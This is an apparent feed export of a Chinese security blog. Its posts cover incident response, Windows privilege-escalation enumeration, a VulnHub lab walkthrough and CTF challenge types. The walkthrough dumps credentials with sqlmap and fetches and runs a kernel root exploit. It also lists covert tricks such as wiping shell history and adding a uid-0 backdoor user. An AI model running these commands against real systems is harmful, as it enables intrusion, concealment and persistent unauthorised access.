<li>cat access.log | sort -k 2 -n -r | head 10 查看最耗时的页面<br>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。<br>1、首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/58627823.jpg" alt=""><br>2、一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-6-17/62810890.jpg" alt=""></li>
</ul>
<h3 id="0x04-应急总结"><a href="#0x04-应急总结" class="headerlink" title="0x04 应急总结"></a>0x04 应急总结</h3><ul>
<li>核心思路是“顺藤摸瓜”</li>
<li>碎片信息的关联分析</li>
<li>时间范围的界定以及关键操作时间点串联</li>
<li>Web入侵类，shell定位很重要</li>
<li>假设与求证</li>
<li>攻击画像与路线确认</li>
</ul>
<h3 id="0x05-渗透反辅"><a href="#0x05-渗透反辅" class="headerlink" title="0x05 渗透反辅"></a>0x05 渗透反辅</h3><p>1、密码读取<br>a) Windows: Mimikatz<br>b) Linux: mimipenguin<br>2、帐号信息<br>a) 操作系统帐号<br>b) 数据库帐号<br>c) 应用帐号信息<br>3、敏感信息<br>a) 配置信息<br>b) 数据库信息<br>c) 服务端口信息<br>d) 指纹信息<br>4、滚雪球式线性拓展<br>a) 密码口令类拓展（远控）<br>b) 典型漏洞批量利用<br>5、常见的入侵方式Getshell方法<br>a) WEB入侵<br>　　i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell<br>　　ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞<br>b) 系统入侵<br>　　i. SSH 破解后登录操作<br>　　ii. RDP 破解后登录操作<br>　　iii. MSSQL破解后远控操作<br>　　iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）<br>c) 典型应用<br>　　i. Mail暴力破解后信息挖掘及漏洞利用<br>　　ii. VPN暴力破解后绕过边界<br>　　iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行<br>　　iv. Rsync 未授权访问类<br>　　v. Mongodb未授权访问类<br>　　vi. Elasticsearch命令执行漏洞<br>　　vii. Memcache未授权访问漏洞<br>　　viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p>
<h3 id="0x06-资源参考"><a href="#0x06-资源参考" class="headerlink" title="0x06 资源参考"></a>0x06 资源参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">https://www.waitalone.cn/linux-find-webshell.html</div><div class="line">http://vinc.top/category/yjxy/</div><div class="line">http://www.shellpub.com/</div><div class="line">http://linux.vbird.org/linux_security/0420rkhunter.php</div><div class="line">https://cisofy.com/download/lynis/</div><div class="line">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</div><div class="line">http://www.freebuf.com/articles/web/23358.html</div><div class="line">https://www.microsoft.com/en-us/download/details.aspx?id=24659</div><div class="line">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</div><div class="line">http://wooyun.jozxing.cc/static/drops/tips-7462.html</div><div class="line">http://bobao.360.cn/learning/detail/3830.html</div><div class="line">https://yq.aliyun.com/ziliao/65679</div><div class="line">http://secsky.sinaapp.com/188.html</div><div class="line">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</div><div class="line">http://www.sleuthkit.org/autopsy/</div></pre></td></tr></table></figure>
<p>转载连接：<a href="https://xianzhi.aliyun.com/forum/read/1655.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/1655.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-事件分类&quot;&gt;&lt;a href=&quot;#0x00-事件分类&quot; class=&quot;headerlink&quot; title=&quot;0x00 事件分类&quot;&gt;&lt;/a&gt;0x00 事件分类&lt;/h3&gt;&lt;p&gt;常见的安全事件：&lt;br&gt;　　Web入侵：挂马、篡改、Webshell&lt;br&gt;　　系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞&lt;br&gt;　　病毒木马：远控、后门、勒索软件&lt;br&gt;　　信息泄漏：拖裤、数据库登录（弱口令）&lt;br&gt;　　网络流量：频繁发包、批量请求、DDOS攻击&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="应急响应" scheme="https://zjw.dropsec.xyz/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>windows权限提升基础</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/05/19/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/05/19/windows权限提升基础.html</id>
    <published>2017-05-19T13:50:40.000Z</published>
    <updated>2017-05-30T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-获取操作系统信息"><a href="#0x01-获取操作系统信息" class="headerlink" title="0x01 获取操作系统信息"></a>0x01 获取操作系统信息</h3><ul>
<li><p>识别操作系统名称及版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>识别系统体系结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo %PROCESSOR_ARCHITECTURE%</div></pre></td></tr></table></figure>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>查看所有环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET</div></pre></td></tr></table></figure>
</li>
<li><p>查看在线用户，有时候低权限看不到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">query user</div></pre></td></tr></table></figure>
</li>
<li><p>查询终端端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</div></pre></td></tr></table></figure>
</li>
<li><p>查看某特定用户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net user test</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x02-获取网络信息"><a href="#0x02-获取网络信息" class="headerlink" title="0x02 获取网络信息"></a>0x02 获取网络信息</h3><ul>
<li><p>查看路由表信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">route print</div></pre></td></tr></table></figure>
</li>
<li><p>查看ARP缓存信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arp -a</div></pre></td></tr></table></figure>
</li>
<li><p>查看网络连接和防火墙规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div><div class="line">netsh firewall show config</div><div class="line">netsh firewall show state</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x03-应用程序及服务信息"><a href="#0x03-应用程序及服务信息" class="headerlink" title="0x03 应用程序及服务信息"></a>0x03 应用程序及服务信息</h3><ul>
<li><p>查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /QUERY /fo LIST /v</div></pre></td></tr></table></figure>
</li>
<li><p>查看服务进程ID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tasklist /SVC</div></pre></td></tr></table></figure>
</li>
<li><p>查看已经启动Windows 服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net start</div></pre></td></tr></table></figure>
</li>
<li><p>查看安装驱动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DRIVERQUERY</div></pre></td></tr></table></figure>
</li>
<li><p>查看安装程序和版本信息（漏洞利用线索）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product list brief</div></pre></td></tr></table></figure>
</li>
<li><p>查看服务、进程和启动程序信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div><div class="line">wmic process list brief</div><div class="line">wmic startup list brief</div></pre></td></tr></table></figure>
</li>
<li><p>查看服务权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc mysqla</div></pre></td></tr></table></figure>
</li>
<li><p>查看安装补丁和时间信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div></pre></td></tr></table></figure>
</li>
<li><p>查看特定漏洞补丁信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x04-敏感数据和目录"><a href="#0x04-敏感数据和目录" class="headerlink" title="0x04 敏感数据和目录"></a>0x04 敏感数据和目录</h3><ul>
<li>查找密码文件或其它敏感文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cd/</div><div class="line">dir /b/s password.txt # Will search for all password.txt files on the filesystem.</div><div class="line">dir /b/s config.* # Will search for all files starting with &apos;config&apos; on the filesystem.</div><div class="line">findstr /si password *.xml *.ini *.txt</div><div class="line">findstr /si login *.xml *.ini *.txt</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x05-文件系统"><a href="#0x05-文件系统" class="headerlink" title="0x05 文件系统"></a>0x05 文件系统</h3><ul>
<li><p>打包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rar a -k -r -s -m3 c:\1.rar c:\folde</div></pre></td></tr></table></figure>
</li>
<li><p>检查文件夹可写状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dir /a-r-d /s /b</div></pre></td></tr></table></figure>
</li>
</ul>
<p>参考：<a href="http://www.goldfire.cc/index.php/archives/660" target="_blank" rel="external">http://www.goldfire.cc/index.php/archives/660</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-获取操作系统信息&quot;&gt;&lt;a href=&quot;#0x01-获取操作系统信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取操作系统信息&quot;&gt;&lt;/a&gt;0x01 获取操作系统信息&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;识别操作系统名称及版本&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systeminfo | findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;systeminfo | findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;识别系统体系结构&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;echo %PROCESSOR_ARCHITECTURE%&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="提权" scheme="https://zjw.dropsec.xyz/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>一次基于Linux的渗透测试</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2017/05/18/%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8ELinux%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2017/05/18/一次基于Linux的渗透测试.html</id>
    <published>2017-05-18T07:52:39.000Z</published>
    <updated>2017-05-18T08:49:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　最近发现了一个不错的<a href="https://www.vulnhub.com" target="_blank" rel="external">靶场</a>，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个<a href="https://www.exploit-db.com" target="_blank" rel="external">漏洞利用存档</a>，可以找到很多我们可以利用的学习的东西。 </p>
<h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><ul>
<li>首先就是确定我们靶机的目标IP<br><code>nmap -sP -T5 192.168.0.1/24</code><a id="more"></a><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/69675734-file_1495024767524_12b41.png" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/92578056-file_1495024794093_f650.png" alt=""><br>通过前面的步骤，我们对目标进行具体的端口扫描以及操作系统识别，发现开启有80，22以及6667端口。<br><code>nmap -sV -p- -A -O -T4 192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/29748247-file_1495025167563_18075.png" alt=""> </li>
<li>目录扫描<br>继续对目标进行敏感目录扫描，御剑等工具都可以。这里我使用KALI的<code>nikto</code>以及<code>dirb</code>命令进行简单的目录扫描。<br><code>nikto -host http://192.168.0.170</code>或者<code>dirb http://192.168.0.170</code></li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/1901036-file_1495026985555_c687.jpg" alt=""></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/34894438-file_1495026990934_c5e1.jpg" alt=""></p>
<h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h3><p>　　访问IP之后的页面，发现并没有什么特别的地方，于是只能查看源代码，点击超链接进行查看。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72915652-file_1495025513089_4b42.png" alt=""></p>
<p>在链接的地方竟然发现了秘密的地方，于是访问之<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/16907544-file_1495027180453_a40c.png" alt=""><br>此处是一个登录界面，我们可以尝试注册一个用户进行登录，但只是一个游客的形式。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/77969300-file_1495027584527_6db5.png" alt=""><br>我们注册一个用户进行登录，还有有很多功能的，于是可以进行更多的尝试。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/87595415-file_1495028411853_56b6.png" alt=""></p>
<p>　　在下面发现OpenDocMan v1.2.7， OpenDocMan是一个功能完整的基于Web的文档管理系统(DMS)，于是找找OpenDocMan v1.2.7所公布的一些可以利用的<a href="https://www.exploit-db.com/exploits/32075/" target="_blank" rel="external">漏洞</a>。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/52436738-file_1495029065698_1762a.png" alt=""><br>发现可以利用的好几个漏洞，于是先行尝试sql注入。</p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>　　经过简单的测试发现<code>http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user</code>处确实注入。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72043277-file_1495029395412_5b3f.png" alt=""></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/40331315-file_1495029419098_1162.png" alt=""><br>于是直接拿出神器Sqlmap进行注入。<br><code>sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value --dbs</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/50127468-file_1495029835183_507e.png" alt=""><br>经过常见的那几个命令我们可以成功的拿到登录名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs --tables</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_admin --columns</div></pre></td></tr></table></figure></p>
<p>发现admin表里面没有信息，只能从user表里面提取信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user --columns`</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user -C &quot;username,password&quot; --dump</div></pre></td></tr></table></figure></p>
<p>我们可以看到已经获取到了数据库的用户名和密码，直接MD5解密就可以ssh登录服务器。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/42366405-file_1495083173994_9c37.png" alt=""><br>用户名<code>webmin</code>，密码<code>b78aae356709f8c31118ea613980954b</code>，明文为<code>webmin</code></p>
<h3 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04 权限提升"></a>0x04 权限提升</h3><p>经过前面端口扫描可以发现，22端口发放着，可以进行ssh连接。<code>ssh webmin@192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/75985467-file_1495083672930_ba2a.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/61650463-file_1495083646059_acf0.png" alt=""><br>　　<br>　　查看权限发现是普通用户的权限，所以得继续进行提权操作。获取到低权限SHELL后我们通常做下面几件事：</p>
<ul>
<li>检测操作系统的发行版本</li>
<li>查看内核版本</li>
<li>检测当前用户权限</li>
<li>列举Suid文件</li>
<li>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</li>
</ul>
<p><code>lsb_release -a</code>查看系统的发行版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/73239541-file_1495083911393_12b4.png" alt=""><br><code>uname -a</code>查看内核版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/40320294-file_1495083992867_f6e7.png" alt=""></p>
<p>　　我们可以看到此操作系统采用的是Ubuntu 14.04.4 LTS，内核版本是3.13.0-24-generic，首先想到的就是去漏洞库寻找有没有可以用的exploit。</p>
<p>下载漏洞exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget https://www.exploit-db.com/download/37292</div><div class="line">mv 37292 shell.c</div><div class="line">gcc -o shell shell.c</div><div class="line">./shell</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/23001066-file_1495084882743_12f82.png" alt=""></p>
<p><strong>附Linux渗透小技巧：</strong></p>
<ul>
<li>bash去掉history记录<br>export HISTSIZE=0<br>export HISTFILE=/dev/null</li>
<li>Linux添加uid为0的用户<br>useradd -o -u 0 cnbird</li>
<li>可以翻下 mysql_history .bash_history</li>
<li>ls -al 看下root目录下都有什么隐藏目录 例如 .ssh .vnc 等</li>
<li>可以看下 .ssh/下面的ssh连接记录等，也可以看下全局变量文件什么的</li>
<li>通过webshell反弹shell回来之后获取真正的ttyshell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　最近发现了一个不错的&lt;a href=&quot;https://www.vulnhub.com&quot;&gt;靶场&lt;/a&gt;，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;漏洞利用存档&lt;/a&gt;，可以找到很多我们可以利用的学习的东西。 &lt;/p&gt;
&lt;h3 id=&quot;0x01-信息搜集&quot;&gt;&lt;a href=&quot;#0x01-信息搜集&quot; class=&quot;headerlink&quot; title=&quot;0x01 信息搜集&quot;&gt;&lt;/a&gt;0x01 信息搜集&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;首先就是确定我们靶机的目标IP&lt;br&gt;&lt;code&gt;nmap -sP -T5 192.168.0.1/24&lt;/code&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF常见题型</title>
    <link href="https://zjw.dropsec.xyz/CTF/2017/04/29/CTF%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B.html"/>
    <id>https://zjw.dropsec.xyz/CTF/2017/04/29/CTF常见题型.html</id>
    <published>2017-04-29T05:11:47.000Z</published>
    <updated>2017-04-29T05:17:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h2><ul>
<li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li>
<li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">注入：http://103.238.227.13:10087/</div><div class="line">盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php</div><div class="line">注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=,+,-,^,%</div><div class="line">http://web.jarvisoj.com:32787/</div></pre></td></tr></table></figure>
<a id="more"></a>
<ul>
<li>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、</li>
<li>四、PHP伪协议，zip://、phar://、php://filter/read等</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32768/</div></pre></td></tr></table></figure>
<ul>
<li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、</li>
<li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% 、花式解析漏洞</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://c.bugku.com/web9/</div><div class="line">http://web.jarvisoj.com:32790/</div><div class="line">http://web.jarvisoj.com:32785/index.php#</div></pre></td></tr></table></figure>
<ul>
<li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li>
<li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li>
<li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li>
<li>十、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li>
<li>十一、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li>
<li>十二、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XSS:http://103.238.227.13:10089/</div></pre></td></tr></table></figure>
<ul>
<li>十三、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:9882/  请设法获得目标机器/home/ctf/flag.txt中的flag值。</div></pre></td></tr></table></figure>
<ul>
<li>十四、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li>
<li>十五、python脚本，盲注脚本、POST提交脚本等，常见python库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">urllib、urllib2、requests   # 发送 HTTP 请求的</div><div class="line">urlparse                    # 处理 url </div><div class="line">re                          # 正则表达式</div><div class="line">random                      # 生成随机数的</div><div class="line">hashlib                     # 集成md5算法</div><div class="line">base64                      # base64编码</div><div class="line">socket                      # 套接字</div><div class="line">os/sys      </div><div class="line"></div><div class="line">练习：http://c.bugku.com/web6/</div></pre></td></tr></table></figure>
<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><ul>
<li>一、压缩包加密，伪加密、暴力破解、明文攻击、CRC32碰撞</li>
<li>二、图片隐写，LSB、Stegsolve、binwalk、foremost、JPHS、文件头部属性、RGB图片像素点还原</li>
<li>三、音频隐写，MP3Stego、分析频谱</li>
<li>四、流量包分析，追踪流、直接导出、binwalk、foremost</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、[这么多数据包找找吧，先找到getshell的流]http://ctf.bugku.com/files/bcd48bf8357a2f4e41ef16705443c46e/CTF.pcapng.zip</div><div class="line">2、 http://ctf5.shiyanbar.com/misc/misc300.zip</div></pre></td></tr></table></figure>
<ul>
<li>五、社工，包括花式查社工库、微博、QQ签名、whois</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、[简单个人信息搜集](http://ctf.bugku.com/files/578343f52edfa1107fae1c76f0f9a48a/1.zip)</div><div class="line">2、name:孤长离  提示：弱口令</div></pre></td></tr></table></figure>
<h2 id="0x03-Crypto"><a href="#0x03-Crypto" class="headerlink" title="0x03 Crypto"></a>0x03 Crypto</h2><ul>
<li>一、古典密码</li>
<li>二、现代密码，RSA、hash长度扩展、异或、移位加密各种变形、32位随机数过小、唯密文攻击</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">链接: http://pan.baidu.com/s/1i4TQoz7 密码: w65m</div><div class="line">提示：第一层：CRC32 碰撞;第二层：维吉尼亚密码;第三层：sha1 碰撞;第四层：md5 相同文件不同;第五层：RSA</div><div class="line">RSA：http://ctf5.shiyanbar.com/crypto/RSA</div><div class="line">唯密文攻击：http://ctf5.shiyanbar.com/crypto/ciphertext.zip（试试看破解这个 1024 位 RSA 系统。flag的形式是 CTF&#123;USTC-X&#125;，X 是 RSA 的两个素数中较小的那个（取其大写MD5的前6位））</div></pre></td></tr></table></figure>
